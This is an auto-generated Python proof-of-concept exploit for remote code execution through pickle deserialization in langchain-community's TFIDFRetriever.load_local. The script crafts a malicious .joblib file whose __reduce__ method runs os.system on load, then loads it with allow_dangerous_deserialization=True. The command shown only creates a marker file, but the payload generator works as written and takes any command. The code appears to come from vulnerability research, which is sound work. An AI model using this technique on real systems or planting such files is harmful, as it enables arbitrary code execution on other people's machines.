#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-019
# Sink: load_local
# Auto-generated — run with: python3 rce_true_caller_enable_deserialization_load_local.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept for RCE in langchain-community.load_local

Vulnerability: The `load_local` function deserializes pickle/joblib files from
a path constructed from user-controlled `folder_path` and `file_name`. The only
guard is a boolean `allow_dangerous_deserialization`. If a caller sets it to True
and passes attacker-controlled inputs, an attacker can place a malicious file
(e.g., via path traversal) and achieve code execution during deserialization.

This script demonstrates the exploit by:
1. Creating a benign malicious .joblib file that executes `touch /tmp/poc_success.txt`.
2. Invoking `TFIDFRetriever.load_local` with controlled `folder_path` and `file_name`.
3. Verifying that the payload executed.

Tested against langchain-community-only located at /tmp/langchain-community-only.
"""

import os
import sys
import tempfile
import pickle
import subprocess
from pathlib import Path

# Ensure langchain-community is importable from the given path
LANGCHAIN_COMMUNITY_PATH = "/tmp/langchain-community-only"
if LANGCHAIN_COMMUNITY_PATH not in sys.path:
    sys.path.insert(0, LANGCHAIN_COMMUNITY_PATH)

try:
    from langchain_community.retrievers.tfidf import TFIDFRetriever
except ImportError as e:
    print(f"[!] Failed to import TFIDFRetriever: {e}")
    print("[!] Ensure langchain-community is installed at", LANGCHAIN_COMMUNITY_PATH)
    sys.exit(1)


def create_malicious_joblib(filepath: Path, command: str) -> None:
    """Create a malicious joblib file that executes the given command on load.

    joblib.load uses pickle internally, so we craft a pickled object with a
    __reduce__ method that runs the command via os.system.
    """
    class MaliciousPayload:
        def __reduce__(self):
            return (os.system, (command,))

    # joblib files are just pickled objects (protocol 2 or higher typical)
    data = pickle.dumps(MaliciousPayload(), protocol=2)
    filepath.write_bytes(data)
    print(f"[+] Created malicious joblib file: {filepath}")


def main():
    # --- Configuration ---
    # Benign payload: create a marker file to prove code execution
    PAYLOAD_COMMAND = "touch /tmp/poc_success.txt"
    # The file name used in load_local (must match the .joblib file we create)
    FILE_NAME = "exploit"
    # Directory to host the malicious file
    WORK_DIR = Path(tempfile.mkdtemp(prefix="langchain_poc_"))

    print("[*] Proof-of-Concept for langchain-community RCE")
    print(f"[*] Working directory: {WORK_DIR}")
    print(f"[*] Payload: {PAYLOAD_COMMAND}")

    # Step 1: Create the malicious .joblib file
    malicious_joblib = WORK_DIR / f"{FILE_NAME}.joblib"
    create_malicious_joblib(malicious_joblib, PAYLOAD_COMMAND)

    # The .pkl file is also required, but we can create a dummy one.
    dummy_pkl = WORK_DIR / f"{FILE_NAME}.pkl"
    if not dummy_pkl.exists():
        # Just a placeholder; the real exploit happens in .joblib
        with open(dummy_pkl, "wb") as f:
            pickle.dump([], f)
        print(f"[+] Created dummy pickle file: {dummy_pkl}")

    # Step 2: Invoke the vulnerable function with attacker-controlled inputs
    print("[*] Calling TFIDFRetriever.load_local with controlled path...")
    try:
        # The function expects folder_path (as string), file_name, and
        # allow_dangerous_deserialization=True.
        result = TFIDFRetriever.load_local(
            folder_path=str(WORK_DIR),
            file_name=FILE_NAME,
            allow_dangerous_deserialization=True,
        )
        print(f"[+] load_local returned: {result}")
    except Exception as e:
        print(f"[!] An error occurred during deserialization: {e}")
        # The payload might have already executed even if loading fails later.
        # Continue to check for the marker.

    # Step 3: Verify that the payload executed
    marker = Path("/tmp/poc_success.txt")
    if marker.exists():
        print("[+] SUCCESS: /tmp/poc_success.txt was created!")
        print("[+] The payload executed during deserialization.")
    else:
        print("[*] Marker not found; the payload may not have executed.")
        print("[*] Check stderr for any errors (os.system runs in background).")

    # Cleanup (optional)
    marker.unlink(missing_ok=True)
    import shutil
    shutil.rmtree(WORK_DIR, ignore_errors=True)
    print("[*] Cleanup done.")


if __name__ == "__main__":
    main()
